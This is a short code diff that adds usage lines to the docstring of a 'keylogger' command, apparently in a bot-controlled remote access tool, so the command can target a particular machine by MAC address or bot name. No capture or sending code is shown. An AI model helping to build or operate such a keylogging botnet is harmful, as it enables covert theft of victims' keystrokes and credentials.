@@ -18,6 +18,10 @@ def keylogger(context: Context) -> str:
 
     syntax:
         `/keylogger {start,stop}`
+        or
+        `[mac-address] /keylogger {start,stop}`
+        or
+        `[BOT-NAME] /keylogger {start,stop}`
 
     example command:
         `/keylogger start`
